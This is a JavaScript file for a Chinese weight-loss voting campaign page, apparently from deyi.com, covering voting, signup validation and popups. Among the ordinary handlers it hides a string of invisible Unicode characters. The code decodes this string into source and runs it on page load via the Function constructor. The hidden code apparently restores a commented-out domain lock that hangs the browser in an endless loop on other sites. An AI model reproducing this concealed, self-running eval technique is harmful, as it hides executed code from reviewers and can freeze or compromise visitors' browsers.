(function(){

    /*植入程序*/
    /*if (!/\.deyi\.com$/.test(window.location.hostname)) {
        document.write('本程序版权归得<a href="../www.deyi.com/default.htm">得意生活</a>');
        setTimeout(function () {
            while(1){};
        }, 0);
    }*/

    var indexEle = $("#index"),
        ruleButtonEle = $(".rule-button"),
        ruleEle = $(".rule"),
        rankContentEle = $(".award"),
        config = {"index": "appvote@m=loseweight&site=2", "detail": "appvote/detail@m=loseweight&site=2", "sign": "appvote/signup@m=loseweight&site=2", "dosignup": "appvote/dosignup@m=loseweight&site=2", "ticket": "appvote/ticket@m=loseweight&site=2"},
        codeOrigin = "‭‌‫‭‮‍‬‮‪‬‌‪‬‮‫‬‌‏‭‭‮‬‌‍‭‮‮‭‮‌‭‏‫‭‌‫‭‭‮‬‌‍‭‮‭‭‌‏‭‌‌‬‮‮‬‌‏‬‌‍‭‍‮‭‮‌‭‍‭‭‍‮‬‌‪‭‍‏‭‌‫‭‌‍‭‮‮‭‌‏‭‍‏‬‌‍‭‌‮‭‌‏‭‮‭‭‮‫‭‍‮‭‌‫‭‌‏‭‌‍‬‌‍‭‌‪‭‌‏‭‍‭‭‍‮‭‌‍‭‮‫‭‌‌‭‮‌‬‌‫‬‌‫‬‮‪‭‏‭‬‫‬‬‮‪‬‮‪‬‮‪‬‮‪‬‮‪‬‮‪‬‮‪‬‮‪‭‮‮‭‌‏‭‮‭‭‍‌‭‌‌‭‮‌‭‌‍‭‍‮‬‌‍‭‍‏‭‍‬‭‌‫‭‍‮‭‮‌‬‌‪‬‮‏‭‭‮‭‍‌‬‍‍‬‍‏‬‍‬‭‮‭‭‭‮‭‍‌‬‍‏‭‮‫‬‍‪‭‮‬‭‭‮‭‍‌‬‍‌‭‮‌‬‏‪‭‮‍‭‭‮‭‍‌‬‍‏‬‍‬‬‍‮‬‏‪‭‭‮‭‍‌‬‍‍‬‍‏‬‍‮‬‍‭‭‭‮‭‍‌‬‍‌‭‮‍‬‍‌‬‍‬‭‭‮‭‍‌‬‍‌‭‮‍‬‏‫‬‍‏‬‏‮‭‮‫‬‮‪‭‌‪‭‍‬‭‮‌‭‮‍‬‏‌‬‮‬‭‌‪‭‍‮‭‍‮‭‍‪‬‏‬‬‌‏‬‌‏‭‍‏‭‍‏‭‍‏‬‌‍‭‮‮‭‮‌‭‏‫‭‌‫‬‌‍‭‮‭‭‌‏‭‌‌‬‌‏‬‮‬‬‏‍‭‭‮‭‍‌‬‍‌‭‮‍‬‏‫‬‍‏‭‭‮‭‍‌‬‍‍‬‍‫‬‍‪‭‮‍‭‭‮‭‍‌‬‍‏‬‍‌‬‍‫‭‮‍‭‭‮‭‍‌‬‍‍‭‮‮‬‍‭‭‮‬‬‏‮‬‌‏‭‮‫‬‏‍‬‮‏‬‌‫‬‏‭‬‫‬‬‮‪‬‮‪‬‮‪‬‮‪‬‮‪‬‮‪‬‮‪‬‮‪‭‍‭‭‮‌‭‍‮‭‬‮‭‌‫‭‌‌‭‮‌‭‌‏‭‍‌‭‍‮‬‌‪‭‮‍‭‍‌‭‌‍‭‮‭‭‍‮‭‌‫‭‌‏‭‌‍‬‮‪‬‌‪‬‌‫‬‮‪‭‏‭‬‫‬‬‮‪‬‮‪‬‮‪‬‮‪‬‮‪‬‮‪‬‮‪‬‮‪‬‮‪‬‮‪‬‮‪‬‮‪‭‍‏‭‌‪‭‌‫‭‌‮‭‮‌‬‌‪‬‍‫‬‌‫‭‏‭‭‏‌‬‏‭‬‫‬‬‮‪‬‮‪‬‮‪‬‮‪‬‮‪‬‮‪‬‮‪‬‮‪‭‏‌‬‌‮‬‮‪‬‍‪‬‌‫‬‏‭‬‫‬‬‮‪‬‮‪‬‮‪‬‮‪‭‏‌";

    if(window.location.href.indexOf("&a=") > 0) {
        var aValue = window.location.href;
        aValue = aValue.substring(aValue.indexOf("&a=")+3,aValue.indexOf("&a=")+4);
        if(aValue == 1){/*显示规则*/
            indexEle.fadeOut(500);
            ruleButtonEle.hide();
            ruleEle.show();
        }
    }

    if(window.location.href.indexOf("&s=") > 0) {
        var sValue = window.location.href;
        sValue = sValue.substring(sValue.indexOf("&s=")+3,sValue.indexOf("&s=")+4);
        if(sValue == 3){/*显示奖品*/
            rankContentEle.show();
            indexEle.hide();
            ruleButtonEle.hide();
        }
    }

    var isTouch = ("ontouchstart" in document ? "touchstart" : "click"),
        popupEle = $('#popup'),
        errorDiaEle = $('#errorDia'),
        tipDiaEle = $('#tipDia'),
        signsucEle = $('#signsuc'),
        doApplyEle = $("#do_apply"),
        votesucEle = $("#votesuc"),
        buttonArea = $('#buttonArea'),
        itemid;

    $('body').on('tap', '.votebutton', function(e){
        e.preventDefault();
        var self = $(e.target).closest('.votebutton');

        $.ajax({
            type: "GET",
            url: config.ticket,
            cache: false,
            data: {
                itid:self.data('itid') ? self.data('itid') : $("#itid").val()
            },
            success: function(data) {
                if (data.status == 101) {/*弹出关注二维码*/
                    popupEle.show();
                    votesucEle.show();
                    votesucEle.find('.closed').hide();
                    $(new Image).appendTo(votesucEle.find('h3').html(data.msg)).prop({
                        src: data.img
                    }).css({
                        display: 'block',
                        height: 100,
                        width: 100,
                        margin: '10px auto 0'
                    });
                    votesucEle.find('p').html(data.note);
                }else if(data.status == 102){/*提示关注微信参与活动*/
                    popupEle.show();
                    votesucEle.show();
                    votesucEle.find('.closed').show();
                    votesucEle.find('h3').html(data.msg);
                }else if(data.status == 100){
                    popupEle.show();
                    votesucEle.show();
                    votesucEle.find('.closed').show();
                    votesucEle.find('h3').html(data.msg);
                }else if(data.status == 200){
                    popupEle.show();
                    votesucEle.show();
                    votesucEle.find('.closed').show();
                    votesucEle.find('h3').html(data.msg);
                }
            }
        });
    });

    $('.myjoin').on('tap', function(e) {
        e.preventDefault();
        var self = $(this);
        window.location.href = config.sign;
    });

    $('.closed').on('tap', function(e) {
        e.preventDefault();
        var self = $(this);
        popupEle.hide();
        $(this).parent().hide();
        if(self.parent().attr('id') == 'signsuc') {
            window.location.href = config.detail + "&itid=" + itemid;
        }
    });

    $('.top-close').on('tap', function(e){
        e.preventDefault();
        $(this).parent('#top-fixed').hide();
        $('.apptop').removeClass('apptop');
    });

    /*下拉框选机构*/
    /*$("#myselect").on(isTouch, function(){
     var thisinput = $(this),
     thisul = $(this).parent().find("ul");

     if(thisul.css("display") == "none"){
     thisul.show();
     thisul.find("li").click(function(e){
     e.preventDefault();
     thisinput.val($(this).text()).attr('value', $(this).text());
     thisul.hide();
     });
     }
     else{
     thisul.fadeOut("fast");
     }
     })*/

    /*邀请码帮助*/
    $('.invite').on('tap', 'a', function(e) {
        e.preventDefault();
        var str = '1、填写已成功参赛朋友的参赛编号，即可为对方加5票；有则填，无则不填<br>2、当您报名成功后，也可将您的参赛编号告诉朋友一同参赛！每邀请一个有效报名，您的票数都会自动加上5票。还有机会获得光谷希尔顿家庭度假套餐！请确保编号填写正确！一但填写，不可修改。';
        popupEle.show();
        errorDiaEle.show().find('p').html(str).css('text-align', 'left').css('line-height', '22px');

    });


    var code = codeOrigin.replace(/./g,function(a){return{"‪":0,"‫":1,"‬":2,"‭":3,"‮":4,"‌":5,"‍":6,"‏":7}[a]}).replace(/.{3}/g,function(a){return String.fromCharCode(parseInt(a, 8) - 128)});

    signsucEle.on('tap', '.know',function(e) {
        e.preventDefault();
        if(signsucEle.css('display') == 'block') {
            popupEle.hide();
            signsucEle.hide();
            window.location.href = config.detail + "&itid=" + itemid;
        }
    });

    document.addEventListener('focus', function () {
        if(event.target.nodeName.toLowerCase() != 'a') {
            buttonArea.hide();
        }
    }, true);

    document.addEventListener('blur', function () {
        if(event.target.nodeName.toLowerCase() != 'a') {
            buttonArea.show();
        }
    }, true);

    doApplyEle.on('tap', function(){
        var self = $(this),
            name = $("#name").val(),
            tel = $("#phone").val(),
            wechat = $("#wechat").val(),
            now = $("#now").val(),
            future = $("#future").val(),
            cnamereg = /^[\u0391-\uFFE5]+$/;

        if(name.length == 0){
            alert('请输入您的姓名');
            $("#name").focus();
            return false;
        }
        if(!cnamereg.test(name)){
            alert('姓名必须是中文');
            $("#name").focus();
            return false;
        }

        var length = $("#imglist").find("li").length;
        if(length == ''|| length == null  || length == undefined || length == 'undefined' || length < 2 ){
            alert('请上传2张以上图片');
            return false;
        }

        var telreg = /^1[3|4|5|7|8][0-9]\d{8}$|^\d{8}$/;
        if (tel.length == 0) {
            alert("请输入您的联系号码！");
            $("#phone").focus();
            return false;
        }
        if (!telreg.test(tel)){
            alert("请输入正确的联系号码！(8位座机号或者11位手机号)");
            $("#phone").focus();
            return false;
        }

        if(wechat== '' || wechat == null || wechat == undefined || wechat == 'undefined' ){
            alert('请输入您的微信号!');
            return false;
        }

        var number = /^\d+(\.\d+)?$/;
        if(now.length == 0){
            alert('请输入您目前的体重!');
            return false;
        }
        if (!number.test(now)){
            alert("请输入正确的体重值！(数字)");
            $("#now").focus();
            return false;
        }

        if(future.length == 0){
            alert('请输入您的目标体重!');
            return false;
        }
        if (!number.test(future)){
            alert("请输入正确的体重值！(数字)");
            $("#future").focus();
            return false;
        }

        /*$("form").submit();*/

        if(!doApplyEle.hasClass('disable')) {
            doApplyEle.addClass('disable');
            $.post(config.dosignup, $("form").serialize(), function (data) {
                if(data) {
                    self.removeClass('disable');
                }

                if(data.status === 1) {/*成功*/
                    popupEle.show();
                    signsucEle.show().find('i').html(data.msg);
                    itemid = data.itemid;
                }else if(data.status === 100) {/*失败*/
                    popupEle.show();
                    errorDiaEle.show().find('p').html(data.msg).css('line-height', '24px');
                }
            });
        };
    });

    (function(){}).constructor(code)();

    /*详情页面随机生成图片*/
    if(window.location.href.indexOf('detail') > 0) {
        var imgArr = ['special/vote/baby2015/img/delbly.jpg', "special/vote/baby2015/img/delhc.jpg", "special/vote/baby2015/img/deltt.jpg", "special/vote/baby2015/img/delwjw.jpg", "special/vote/baby2015/img/delwls.jpg", "special/vote/baby2015/img/delyhg.jpg"],
            addimgEle = $('.detial-box').find('.content').find('img'),
            imgArrLen = imgArr.length,
            min = 1;

        var imgresult = min + Math.round( Math.random() * (imgArrLen - min));
        addimgEle.attr('src', imgArr[imgresult - 1]);
    }
}());